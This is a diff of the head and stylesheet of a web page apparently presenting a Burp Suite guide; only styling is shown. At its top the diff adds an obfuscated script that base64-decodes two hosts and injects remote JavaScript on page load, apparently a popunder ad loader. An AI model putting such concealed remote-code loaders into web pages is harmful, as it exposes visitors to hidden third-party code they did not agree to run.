@@ -1,855 +1,1423 @@
-<!-- ===== BURP SUITE COMPENDIUM - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
-<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var v=window,q="e25514fe4b35f595db6750aa70f72f50",h=[["siteId",322*819*448+424-112824949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlwb3B1cC5jb20vamRhcmttb2RlLWpzLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWC9yZmpzb24ubWluLmpz"],e=-1,d,s,k=function(){clearTimeout(s);e++;if(o[e]&&!(1816360970000<(new Date).getTime()&&1<e)){d=v.document.createElement("script");d.type="text/javascript";d.async=!0;var a=v.document.getElementsByTagName("script")[0];d.src="https://"+atob(o[e]);d.crossOrigin="anonymous";d.onerror=k;d.onload=function(){clearTimeout(s);v[q.slice(0,16)+q.slice(0,16)]||k()};s=setTimeout(k,5E3);a.parentNode.insertBefore(d,a)}};if(!v[q]){try{Object.freeze(v[q]=h)}catch(e){}k()}})();
+/*]]>/* */
+</script>
 
-<style>
-    /* ===== FULL SCREEN WRAPPER ===== */
-    .cyber-post-wrapper {
-        width: 100% !important;
-        max-width: 100% !important;
-        margin: 0 !important;
-        padding: 30px 40px 50px !important;
-        background: #000000 !important;
-        color: #ffffff;
-        border-radius: 0 !important;
-        box-sizing: border-box;
-    }
-    
-    /* ===== RESPONSIVE FULL SCREEN MARGINS ===== */
-    @media (max-width: 1200px) {
-        .cyber-post-wrapper {
-            padding: 25px 35px 45px !important;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Burp Suite Tools — Complete Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper {
-            padding: 22px 30px 40px !important;
+
+        html {
+            scroll-behavior: smooth;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper {
-            padding: 18px 22px 35px !important;
+
+        body {
+            font-family: 'Outfit', -apple-system, sans-serif;
+            background: #000000;
+            background-image: 
+                radial-gradient(ellipse 80% 60% at 50% -20%, rgba(0, 255, 136, 0.08), transparent),
+                radial-gradient(ellipse 60% 50% at 100% 100%, rgba(0, 217, 255, 0.05), transparent);
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            padding: 0;
         }
-    }
-    
-    @media (max-width: 600px) {
-        .cyber-post-wrapper {
-            padding: 15px 18px 30px !important;
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 48px 32px 100px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper {
-            padding: 12px 14px 25px !important;
-        }
-    }
-    
-    /* ===== CONTENT MAX WIDTH ===== */
-    .cyber-content {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0;
-    }
-    
-    /* ===== POST HEADER ===== */
-    .post-header-cyber {
-        margin-bottom: 35px;
-        padding-bottom: 25px;
-        border-bottom: 1px solid rgba(0, 255, 136, 0.08);
-        background: transparent;
-    }
-    
-    .post-badge {
-        display: inline-block;
-        padding: 6px 26px;
-        background: rgba(0, 255, 136, 0.08);
-        border: 1px solid #00ff88;
-        border-radius: 50px;
-        color: #00ff88;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-        margin-bottom: 20px;
-    }
-    
-    .post-title-cyber {
-        font-size: 38px;
-        font-weight: 900;
-        line-height: 1.15;
-        color: #ffffff !important;
-        margin: 12px 0 18px;
-        letter-spacing: -0.5px;
-    }
-    
-    .post-title-cyber strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 992px) {
-        .post-title-cyber {
-            font-size: 30px;
-        }
-    }
-    
-    @media (max-width: 768px) {
-        .post-title-cyber {
-            font-size: 24px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .post-title-cyber {
-            font-size: 20px;
-        }
-    }
-    
-    /* ===== FEATURED BOX ===== */
-    .featured-box {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        gap: 35px;
-        background: #0a0a0a !important;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 18px;
-        padding: 32px 38px;
-        margin: 25px 0 38px;
-        justify-content: center;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-box {
-            flex-direction: column;
+
+        /* ===== HEADER ===== */
+        .page-header {
             text-align: center;
-            padding: 25px 22px;
-            gap: 22px;
+            padding: 20px 0 48px;
+            position: relative;
+            margin-bottom: 48px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-box {
-            padding: 20px 16px;
+
+        .page-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
         }
-    }
-    
-    .featured-image {
-        flex-shrink: 0;
-    }
-    
-    .featured-image img {
-        max-width: 220px;
-        height: auto;
-        border-radius: 14px;
-        border: 2px solid #00ff88;
-        transition: 0.3s;
-        background: #000000;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-image img {
-            max-width: 180px;
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 100px;
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-image img {
-            max-width: 150px;
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
         }
-    }
-    
-    .featured-image img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 40px rgba(0, 255, 136, 0.15);
-    }
-    
-    .featured-cta {
-        flex: 1;
-        text-align: center;
-    }
-    
-    .featured-cta p {
-        color: #b0b8c8 !important;
-        margin: 5px 0 12px !important;
-        font-size: 16px;
-    }
-    
-    .featured-cta .main-link {
-        display: inline-block;
-        padding: 15px 42px;
-        background: linear-gradient(135deg, #00ff88, #00cc77);
-        color: #000000 !important;
-        border-radius: 10px;
-        font-weight: 700;
-        font-size: 16px;
-        text-decoration: none;
-        margin-top: 6px;
-        transition: all 0.3s ease;
-        letter-spacing: 0.5px;
-    }
-    
-    .featured-cta .main-link:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 35px rgba(0, 255, 136, 0.25);
-    }
-    
-    .featured-cta .small-note {
-        color: #6a7290 !important;
-        font-size: 13px;
-        margin-top: 12px !important;
-    }
-    
-    .price-tag {
-        display: inline-block;
-        padding: 4px 18px;
-        background: rgba(255, 204, 0, 0.1);
-        border: 1px solid #ffcc00;
-        border-radius: 50px;
-        color: #ffcc00;
-        font-size: 14px;
-        font-weight: 700;
-        margin-top: 8px;
-    }
-    
-    /* ===== HEADINGS ===== */
-    .cyber-post-wrapper h2 {
-        color: #ffffff !important;
-        font-size: 28px;
-        font-weight: 800;
-        margin-top: 40px;
-        margin-bottom: 18px;
-        border-left: 5px solid #00ff88;
-        padding-left: 20px;
-        line-height: 1.3;
-    }
-    
-    .cyber-post-wrapper h2#who {
-        border-left-color: #00d9ff;
-    }
-    
-    .cyber-post-wrapper h2#learn {
-        border-left-color: #ffcc00;
-    }
-    
-    .cyber-post-wrapper h2#structure {
-        border-left-color: #ff6b6b;
-    }
-    
-    .cyber-post-wrapper h2#ethics {
-        border-left-color: #ff6b6b;
-    }
-    
-    .cyber-post-wrapper h2#why {
-        border-left-color: #00d9ff;
-    }
-    
-    .cyber-post-wrapper h2#how {
-        border-left-color: #ffcc00;
-    }
-    
-    .cyber-post-wrapper h2#personal {
-        border-left-color: #00ff88;
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper h2 {
-            font-size: 26px;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h2 {
-            font-size: 24px;
-            padding-left: 16px;
-            margin-top: 35px;
+
+        h1 {
+            font-size: clamp(34px, 5.5vw, 62px);
+            font-weight: 900;
+            line-height: 1.08;
+            letter-spacing: -0.03em;
+            margin-bottom: 18px;
+            background: linear-gradient(180deg, #ffffff 0%, #8892a8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h1 .highlight {
+            background: linear-gradient(135deg, #00ff88 0%, #00d9ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #8892a8;
+            font-size: 17px;
+            font-weight: 300;
+            max-width: 660px;
+            margin: 0 auto 24px;
+        }
+
+        .meta-bar {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 24px 0 0;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: rgba(10, 15, 25, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 100px;
+            color: #8892a8;
+            font-size: 12.5px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .meta-item .ico {
+            font-size: 14px;
+        }
+
+        .meta-item strong {
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 20px;
+            padding: 26px 28px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .toc::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.6;
+        }
+
+        .toc-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h2 {
-            font-size: 20px;
-            padding-left: 14px;
-            margin-top: 28px;
+
+        .toc-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 8px;
+            list-style: none;
+        }
+
+        .toc-list li a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            color: #b0b8c8;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .toc-list li a:hover {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            transform: translateX(4px);
+        }
+
+        .toc-list li a .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        /* ===== SECTIONS ===== */
+        .section {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            border-radius: 20px;
+            padding: 36px 34px;
+            margin-bottom: 26px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+            scroll-margin-top: 20px;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.5;
+        }
+
+        .section:hover {
+            border-color: rgba(0, 255, 136, 0.2);
+        }
+
+        .section-number {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 700;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            padding: 3px 10px;
+            border-radius: 6px;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 25px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+        }
+
+        .section-title .icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 217, 255, 0.06));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 24px 0 12px;
+            letter-spacing: -0.01em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h3::before {
+            content: '▸';
+            color: #00d9ff;
+            font-size: 16px;
+        }
+
+        h4 {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 18px 0 8px;
+        }
+
+        p {
+            color: #b0b8c8;
+            font-size: 15.5px;
+            line-height: 1.75;
             margin-bottom: 14px;
         }
-    }
-    
-    /* ===== PARAGRAPHS ===== */
-    .cyber-post-wrapper p {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 1.95;
-        margin: 16px 0 20px;
-    }
-    
-    .cyber-post-wrapper p strong {
-        color: #00ff88;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper p {
-            font-size: 16px;
-            line-height: 1.85;
+
+        p:last-child {
+            margin-bottom: 0;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper p {
+
+        strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        em {
+            color: #00d9ff;
+            font-style: normal;
+            font-weight: 500;
+        }
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        a:hover {
+            color: #00d9ff;
+            border-bottom-color: #00d9ff;
+        }
+
+        /* ===== LISTS ===== */
+        ul, ol {
+            list-style: none;
+            margin: 12px 0;
+        }
+
+        ul li {
+            color: #b0b8c8;
             font-size: 15px;
+            padding: 10px 0 10px 32px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 8px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        ol {
+            counter-reset: item;
+        }
+
+        ol li {
+            color: #b0b8c8;
+            font-size: 15px;
+            padding: 10px 0 10px 42px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            counter-increment: item;
+        }
+
+        ol li:last-child {
+            border-bottom: none;
+        }
+
+        ol li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 26px;
+            height: 26px;
+            border-radius: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== INLINE CODE ===== */
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 7px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            font-weight: 500;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #04060a;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 18px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.75;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            font-size: 10px;
+            color: #00ff88;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            opacity: 0.5;
+        }
+
+        .code-block code {
+            color: #d4d4d4;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: pre;
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 13px;
+        }
+
+        .cmt { color: #5a6478; font-style: italic; }
+        .cmd { color: #00ff88; font-weight: 500; }
+        .var { color: #00d9ff; }
+        .str { color: #ffd166; }
+        .kw  { color: #ff79c6; font-weight: 600; }
+        .num { color: #bd93f9; }
+        .fn  { color: #50fa7b; }
+        .cls { color: #ffb86c; font-weight: 600; }
+
+        /* ===== CALLOUT ===== */
+        .callout {
+            background: rgba(0, 255, 136, 0.04);
+            border-left: 3px solid #00ff88;
+            border-radius: 0 12px 12px 0;
+            padding: 18px 22px;
+            margin: 20px 0;
+            color: #c8d0e0;
+            font-size: 14.5px;
+            line-height: 1.7;
+        }
+
+        .callout strong {
+            color: #00ff88;
+        }
+
+        .callout.warn {
+            background: rgba(255, 107, 107, 0.04);
+            border-left-color: #ff6b6b;
+        }
+
+        .callout.warn strong {
+            color: #ff6b6b;
+        }
+
+        .callout.info {
+            background: rgba(0, 217, 255, 0.04);
+            border-left-color: #00d9ff;
+        }
+
+        .callout.info strong {
+            color: #00d9ff;
+        }
+
+        /* ===== TABLE ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 18px 0;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            min-width: 520px;
+        }
+
+        thead {
+            background: rgba(0, 255, 136, 0.06);
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 18px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+        }
+
+        td {
+            padding: 13px 18px;
+            color: #b0b8c8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.6;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 255, 136, 0.02);
+        }
+
+        td code {
+            font-size: 12px;
+        }
+
+        /* ===== USE CASES GRID ===== */
+        .use-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .use-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 20px 18px;
+            transition: all 0.25s ease;
+        }
+
+        .use-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .use-card .use-icon {
+            font-size: 26px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .use-card h4 {
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 0 0 8px;
+        }
+
+        .use-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== FOOTER ===== */
+        .page-footer {
+            text-align: center;
+            padding: 48px 0 0;
+            margin-top: 40px;
+            border-top: 1px solid rgba(0, 255, 136, 0.08);
+            color: #4a5568;
+            font-size: 13px;
             line-height: 1.8;
-            margin: 14px 0 16px;
         }
-    }
-    
-    /* ===== LISTS ===== */
-    .cyber-post-wrapper ul,
-    .cyber-post-wrapper ol {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 2.3;
-        padding-left: 0;
-        margin: 14px 0 22px;
-        list-style: none;
-    }
-    
-    .cyber-post-wrapper ul li,
-    .cyber-post-wrapper ol li {
-        color: #b0b8c8 !important;
-        margin-bottom: 4px;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .cyber-post-wrapper ul li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper ul,
-        .cyber-post-wrapper ol {
-            font-size: 15px;
-            line-height: 2.1;
-        }
-        .cyber-post-wrapper ul li {
-            padding-left: 24px;
-        }
-    }
-    
-    /* ===== TWO COLUMN LIST ===== */
-    .two-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 4px 40px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .two-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 16.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .two-col-list li::before {
-        content: "▸";
-        color: #00ff88;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 768px) {
-        .two-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .two-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .two-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== HORIZONTAL RULE ===== */
-    .cyber-post-wrapper hr {
-        border: none;
-        border-top: 1px solid rgba(0, 255, 136, 0.06);
-        margin: 30px 0 32px;
-        background: transparent;
-        height: 1px;
-    }
-    
-    /* ===== SHARE SECTION ===== */
-    .share-section {
-        margin-top: 50px;
-        padding-top: 30px;
-        border-top: 1px solid rgba(0, 255, 136, 0.08);
-    }
-    
-    .share-section p {
-        color: #6a7290 !important;
-        font-size: 15px;
-        text-align: center;
-        margin-bottom: 16px !important;
-    }
-    
-    .share-buttons {
-        display: flex;
-        gap: 16px;
-        justify-content: center;
-        flex-wrap: wrap;
-    }
-    
-    .share-buttons a {
-        padding: 12px 28px;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 10px;
-        color: #b0b8c8 !important;
-        text-decoration: none;
-        font-size: 15px;
-        font-weight: 500;
-        transition: 0.3s;
-        background: transparent;
-    }
-    
-    .share-buttons a:hover {
-        border-color: #00ff88;
-        color: #00ff88 !important;
-        background: rgba(0, 255, 136, 0.04);
-        transform: translateY(-2px);
-    }
-    
-    @media (max-width: 480px) {
-        .share-buttons a {
-            padding: 10px 18px;
-            font-size: 13px;
-        }
-        .share-section {
-            margin-top: 35px;
-            padding-top: 22px;
-        }
-    }
-    
-    /* ===== BOOK HIGHLIGHT BOX ===== */
-    .book-highlight {
-        background: linear-gradient(135deg, rgba(0, 255, 136, 0.05), rgba(0, 217, 255, 0.05));
-        border: 1px solid rgba(0, 255, 136, 0.1);
-        border-radius: 14px;
-        padding: 24px 30px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .book-highlight p {
-        margin: 5px 0 !important;
-        font-size: 16px;
-    }
-    
-    .book-highlight .highlight-title {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .book-highlight {
-            padding: 18px 16px;
-        }
-        .book-highlight p {
-            font-size: 14px;
-        }
-        .book-highlight .highlight-title {
-            font-size: 16px;
-        }
-    }
-    
-    /* ===== ETHICS BOX ===== */
-    .ethics-box {
-        background: rgba(255, 107, 107, 0.05);
-        border: 1px solid rgba(255, 107, 107, 0.15);
-        border-radius: 14px;
-        padding: 22px 28px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .ethics-box .ethics-title {
-        color: #ff6b6b;
-        font-weight: 700;
-        font-size: 20px;
-    }
-    
-    .ethics-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-        color: #ff6b6b !important;
-    }
-    
-    @media (max-width: 480px) {
-        .ethics-box {
-            padding: 16px 16px;
-        }
-        .ethics-box .ethics-title {
-            font-size: 17px;
-        }
-        .ethics-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== AUTHOR BOX ===== */
-    .author-box {
-        background: rgba(0, 255, 136, 0.03);
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 25px 0 30px;
-        text-align: center;
-    }
-    
-    .author-box .author-name {
-        color: #00ff88;
-        font-weight: 700;
-        font-size: 22px;
-    }
-    
-    .author-box .author-title {
-        color: #b0b8c8;
-        font-size: 16px;
-        margin: 5px 0 !important;
-    }
-    
-    @media (max-width: 480px) {
-        .author-box {
-            padding: 16px 16px;
-        }
-        .author-box .author-name {
-            font-size: 18px;
-        }
-        .author-box .author-title {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== BLOGGER OVERRIDES ===== */
-    .blog-posts {
-        max-width: 100% !important;
-        padding: 0 !important;
-    }
-    
-    .post-body {
-        padding: 0 !important;
-        background: #000000 !important;
-    }
-    
-    .post-body-content {
-        background: #000000 !important;
-        padding: 0 !important;
-    }
-    
-    .post-outer {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    .post {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    /* ===== INLINE CODE ===== */
-    .cyber-post-wrapper code:not(pre code) {
-        background: #0a0a0a;
-        padding: 2px 12px;
-        border-radius: 4px;
-        color: #00ff88;
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        font-size: 14.5px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper code:not(pre code) {
-            font-size: 13px;
-            padding: 1px 8px;
-        }
-    }
-    
-    /* ===== IMAGES ===== */
-    .cyber-post-wrapper img {
-        max-width: 100%;
-        height: auto;
-        border-radius: 12px;
-        margin: 10px 0;
-        border: 1px solid rgba(0, 255, 136, 0.05);
-    }
-    
-    .separator {
-        clear: both;
-        text-align: center;
-    }
-    
-    /* ===== LINK STYLES ===== */
-    .cyber-post-wrapper a {
-        color: #00ff88;
-        text-decoration: none;
-        transition: 0.3s;
-    }
-    
-    .cyber-post-wrapper a:hover {
-        color: #00d9ff;
-        text-decoration: underline;
-    }
-    
-    .text-center {
-        text-align: center;
-    }
-    
-    .mt-10 {
-        margin-top: 10px;
-    }
-    
-    /* ===== TIP BOX ===== */
-    .tip-box {
-        background: rgba(0, 217, 255, 0.03);
-        border-left: 4px solid #00d9ff;
-        padding: 16px 22px;
-        margin: 16px 0 22px;
-        border-radius: 0 10px 10px 0;
-    }
-    
-    .tip-box p {
-        color: #00d9ff !important;
-        font-size: 15px;
-        margin: 0 !important;
-    }
-</style>
 
-<!-- ===== MAIN CONTENT ===== -->
-<div class="cyber-post-wrapper">
+        .page-footer .brand {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00ff88;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-    <div class="cyber-content">
+        .page-footer a {
+            border-bottom: none;
+        }
 
-        <!-- ===== POST HEADER ===== -->
-        <div class="post-header-cyber">
-            <div class="post-badge">🛡️ Web Application Security</div>
-            <h1 class="post-title-cyber">The Burp Suite Compendium</h1>
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .container { padding: 28px 18px 70px; }
+            .section { padding: 26px 22px; border-radius: 16px; }
+            .section-title { font-size: 20px; gap: 12px; }
+            .section-title .icon { width: 40px; height: 40px; font-size: 18px; }
+            h1 { font-size: 32px; }
+            .subtitle { font-size: 15px; }
+            .toc { padding: 20px 18px; }
+            .toc-list { grid-template-columns: 1fr; }
+            p { font-size: 14.5px; }
+            ul li { font-size: 14px; }
+            ol li { font-size: 14px; }
+            .code-block { font-size: 12px; padding: 16px 14px; }
+            .code-block code { font-size: 12px; }
+            h3 { font-size: 16px; }
+            .use-grid { grid-template-columns: 1fr; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 20px 12px 60px; }
+            h1 { font-size: 26px; }
+            .section { padding: 22px 16px; }
+            .section-title { font-size: 17px; }
+            .section-title .icon { width: 34px; height: 34px; font-size: 15px; }
+            .meta-bar { gap: 8px; }
+            .meta-item { font-size: 11px; padding: 6px 12px; }
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #05080e; }
+        ::-webkit-scrollbar-thumb { background: #1a2a2a; border-radius: 20px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff8833; }
+    </style>
